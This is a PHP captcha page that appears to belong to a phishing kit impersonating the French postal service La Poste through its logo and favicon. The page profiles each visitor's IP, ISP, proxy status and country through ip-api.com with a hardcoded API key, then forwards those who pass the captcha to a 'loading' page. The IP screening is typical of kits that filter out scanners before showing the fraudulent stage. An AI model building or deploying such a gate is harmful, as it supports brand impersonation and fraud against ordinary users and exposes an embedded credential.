<?php
session_start();
if (!isset($_SESSION['error_captcha'])) {
  $_SESSION['error_captcha'] = 0;
}
$url = 'https://pro.ip-api.com/json/' . $_SERVER['REMOTE_ADDR'] . '?key=J9TQazL9UIH1so3&fields=21164031';
$response = file_get_contents($url);
$data = json_decode($response, true);
if ($data['status'] != "fail") {
  $_SESSION['ipinfo'] = $data;
  $_SESSION['isp'] = $data['isp'];
  $_SESSION['org'] = $data['org'];
  $_SESSION['proxy'] = $data['proxy'];
  $_SESSION['country'] = $data['country'];
  $_SESSION['countryCode'] = $data['countryCode'];
} 

function verifyCaptcha($userResponse) {
  return strtolower($userResponse) === strtolower($_SESSION['captcha']);
}

if (isset($_POST['captcha']) && verifyCaptcha($_POST['captcha'])) {
  $_SESSION['human'] = true;
  header('Location: /home/loading.php?page=index.php');
  exit;
}
$locale = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'fr'; // en for English

$translations = array(
  'fr' => array(
    'captcha_error' => 'Captcha incorrect. Merci de réessayer',
    'enter_captcha' => 'Entrer le texte que vous voyez',
    'submit' => 'Soumettre'
  )
);

if (!isset($_SESSION['human']) || $_SESSION['human'] !== true || $_SESSION['error_captcha'] < 3) {
?>
<!DOCTYPE html>
<html lang="<?php echo $locale; ?>">
<head>
  <meta charset="UTF-8">
  <title>Captcha Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
  <link rel="shortcut icon" href="assets/img/logo-laposte-app-part-23.png" type="image/png">

  <style>
    @font-face {
      font-family: 'font';
      src: url('home/assets/fonts/font.woff2');
    }
    body {
      background-color: #f5f5f5; /* Blanc cassé */
      font-family: 'font';
    }
    *{
      font-family: 'font';
    }

    .captcha-container {
      text-align: center;
      margin-top: 50px;
    }

    .captcha-image {
      border-radius: 10px; /* Bords arrondis */
    }
  </style>
</head>
<body>
  <div class="container d-flex justify-content-center align-items-center vh-100">
    <div class="captcha-container card shadow-sm bg-light rounded-lg p-4">
    <center><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYyIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTYyIDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTIuMjM0MSAwLjY1NTAxNkwyMy45OTc5IDYuMDAyNkg0Mi4wMTY1TDQzLjUwNzUgMy40MTQ2MUM0NC40MDIzIDEuODYyODggNDMuMzIxOCAwIDQxLjY4OTkgMEgxMi4zNjA5QzExLjk2MiAwIDExLjg2NiAwLjQ4NzcyNSAxMi4yMzQyIDAuNjU1MDE2SDEyLjIzNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0yMy45OTc5IDguMjk3ODVINTMuMzQ3M0M1My42ODY5IDguMjk3ODUgNTQuMDE1NCA4LjU2Mzk1IDU0LjAxNTQgOC45NjAzQzU0LjAxNTQgOS4zMTA5NiA1My43NzUyIDkuNTM5NDggNTMuNTMzMSA5LjYwNjU0TDAuNDI3ODE0IDIzLjk4NjhDMC4wODE3ODQ1IDI0LjA4MTYgLTAuMTYxNTM4IDIzLjYzNSAwLjEyOTQxMiAyMy40MDNMMjMuOTk4IDguMjk3ODVIMjMuOTk3OVoiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTkuMTY3OTcgMjQuMDAwM0wyOC40MzUyIDIzLjY0MTlDMzAuMzA0MiAyMy42MDcxIDMyLjQ5MzEgMjIuNTMwMiAzMy40OTE5IDIwLjc5NjVMMzUuODAyNCAxNi43ODYxTDkuMTY3OTcgMjQuMDAwM1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTgyLjA5MSA1LjgzNzEySDc5LjQ4MzlMNzIuODgzOCAxOC41Njc4SDc1LjYzNTFMNzYuODE2OSAxNi4yMjcySDg0LjcyMDRMODUuNDk2NiAxNy43NjRDODUuODc3IDE4LjUxOCA4Ni4yMzAyIDE4LjU2NzYgODcuMjIxMSAxOC41Njc2SDg4LjY5MjFMODIuMDkxIDUuODM2OTFWNS44MzcxMlpNNzcuOTY3MSAxMy45NDc4TDgwLjc2NzkgOC40MDA1M0w4My41Njg2IDEzLjk0NzhINzcuOTY2OUg3Ny45NjcxWiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNOTYuMzI1NSAxNC44MDAxVjE4LjU2NzJIOTMuNzcxNVY1Ljk1NTI4Qzk1LjExMjkgNS45MjA4MiA5Ni45MjM4IDUuODY5MTQgOTguNDIxMiA1Ljg2OTE0QzEwMS4zNDIgNS44NjkxNCAxMDMuMjg2IDYuMjgzNDUgMTA0LjQ0MiA3LjQzOTYzQzEwNS4xNDkgOC4xNzQ1MyAxMDUuNTIgOS4xNjkyOSAxMDUuNDY3IDEwLjE4NzZDMTA1LjQ2NyAxMy44MzA5IDEwMi42MjMgMTQuODIyIDk4LjU2NjcgMTQuODIyQzk4LjAxMzEgMTQuODIyIDk2Ljk3OTMgMTQuODA4NSA5Ni4zMjU1IDE0LjgwMDFaTTk2LjMyNTUgMTIuNDY0M0M5Ni45Njg5IDEyLjQ3NzQgOTcuNzc5NSAxMi40ODY1IDk4LjMzODQgMTIuNDg2NUM5OS45NzYzIDEyLjQ4NjUgMTAxLjQ3OCAxMi40MzY4IDEwMi4yNzkgMTEuNjM1N0MxMDIuNjQ3IDExLjI2MzQgMTAyLjg0IDEwLjc1MjkgMTAyLjgxMiAxMC4yMzAzQzEwMi44MTggOS43OTc3NCAxMDIuNjY0IDkuMzc4MjkgMTAyLjM3OSA5LjA1MzJDMTAxLjU3OSA4LjI1MzQ5IDEwMC40MTcgOC4yMDQwNyA5OC4zMzg0IDguMjA0MDdDOTcuNzc5MyA4LjIwNDA3IDk2Ljk2OTkgOC4yMTMwOSA5Ni4zMjU1IDguMjI2MjJWMTIuNDY0M1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTEyMi4wNzcgMTIuMjYxQzEyMi4wNzcgMTUuODc0OSAxMTkuMjMzIDE4LjgxNTEgMTE0LjQ1NSAxOC44MTUxQzEwOS42NzcgMTguODE1MSAxMDYuODMzIDE1Ljg3NTIgMTA2LjgzMyAxMi4yNjEyQzEwNi44MzMgOC42NDcyMyAxMDkuNjc3IDUuNzA3MDMgMTE0LjQ1NSA1LjcwNzAzQzExOS4yMzMgNS43MDcwMyAxMjIuMDc3IDguNjQ3MDIgMTIyLjA3NyAxMi4yNjFaTTExNC40NTUgOC4wMDAxMUMxMTEuNTYgOC4wMDAxMSAxMDkuNDk0IDkuNjc4MjkgMTA5LjQ5NCAxMi4yNjFDMTA5LjQ5NCAxNC44NDM3IDExMS41NTggMTYuNTIxOCAxMTQuNDU1IDE2LjUyMThDMTE3LjM1MiAxNi41MjE4IDExOS40MTYgMTQuODQzNyAxMTkuNDE2IDEyLjI2MUMxMTkuNDE2IDkuNjc4MjkgMTE3LjM1MiA4LjAwMDExIDExNC40NTUgOC4wMDAxMUgxMTQuNDU1WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTM0Ljk4MyA3LjEyMDQxQzEzMy41OTggNi4yNTU2OSAxMzEuMzQ4IDUuNzA3MDMgMTI5LjY0NyA1LjcwNzAzQzEyNi40NDEgNS43MDcwMyAxMjMuOTIyIDcuMzkyNTkgMTIzLjkyMiA5LjczNzE1QzEyMy45MjIgMTQuMTU0MSAxMzIuNjE3IDEyLjUxNTUgMTMyLjYxNyAxNS4xMzc4QzEzMi42MTcgMTYuMjA3IDEzMS4wMjcgMTYuNjY0NCAxMjkuNjY4IDE2LjY2NDRDMTI3Ljg1MyAxNi42NTA1IDEyNi4wODQgMTYuMDk1OCAxMjQuNTg2IDE1LjA3MTVMMTIzLjI3OCAxNy4wMTU5QzEyNC44NjMgMTguMDk2NCAxMjcuNDE0IDE4LjgxNTcgMTI5LjQ0NSAxOC44MTU3QzEzMi42MiAxOC44MTU3IDEzNS4yNzcgMTcuMzM2MSAxMzUuMjc3IDE0Ljg1OTNDMTM1LjI3NyAxMC4zNzYxIDEyNi42MjEgMTEuNzcxMiAxMjYuNjIxIDkuMzQwMDdDMTI2LjYyMSA4LjMxMDY0IDEyOC4wNTUgNy44NjA0NCAxMjkuNjAyIDcuODYwNDRDMTMxLjA4NyA3Ljg4MTM2IDEzMi41MzYgOC4zMjI5NSAxMzMuNzgxIDkuMTMzOTNMMTM0Ljk4MyA3LjEyMDYyVjcuMTIwNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0xNDguMzg0IDUuOTQ2MjlIMTM2LjE5MlY4LjI5MDQ1SDE0MC45NjdWMTguNTY3N0gxNDMuNTIxVjguMjkwNDVIMTQ4LjM4NFY1Ljk0NjI5WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTQ5Ljk4OCA1Ljk0NjI5VjE3LjY1OTdDMTQ5Ljk4OCAxOC4xODYyIDE1MC4zMTMgMTguNTY3OSAxNTAuOSAxOC41Njc5SDE2MS4xOFYxNi4yMzNIMTUyLjU0MVYxMy4yOTc3SDE2MC4yNTVWMTAuOTYzSDE1Mi41NDFWOC4yOTA4NUgxNjAuOTVWNS45NDY1SDE0OS45ODciIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTY1LjQxMjkgNS45NDYyOUg2Mi44NTk0VjE3LjY1OTdDNjIuODU5NCAxOC4xODYyIDYzLjE4NDcgMTguNTY3OSA2My43NzIxIDE4LjU2NzlINzEuNDAxNEw3Mi42MTMgMTYuMjMyOEg2NS40MTMxVjUuOTQ2NUw2NS40MTI5IDUuOTQ2MjlaIiBmaWxsPSIjMDAzREE1Ii8+Cjwvc3ZnPgo=" width="80%" alt=""><br><br>
  <h3>Vérification Anti-Robot</h3><br></center>  
    <form method="post">
        <?php
        // Display error message if captcha is incorrect
        if (isset($_POST['captcha']) && !verifyCaptcha($_POST['captcha'])) {
          $_SESSION['error_captcha'] += 1;
          echo '<div class="alert alert-danger">' . $translations[$locale]['captcha_error'] . '</div>';
        }
        ?>
        <img src="generate_captcha.php" alt="Captcha" class="mb-3">
        <label for="captcha" class="form-label visually-hidden"><?php echo $translations[$locale]['enter_captcha']; ?></label>
        <input type="text" name="captcha" id="captcha" placeholder="<?php echo $translations[$locale]['enter_captcha']; ?>" class="form-control" aria-required="true" required>
        <button type="submit" class="btn btn-primary mt-3"><?php echo $translations[$locale]['submit']; ?></button>
      </form>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
<?php
}else{
  die('An error occurred while trying to access this website. Please try again later');
}
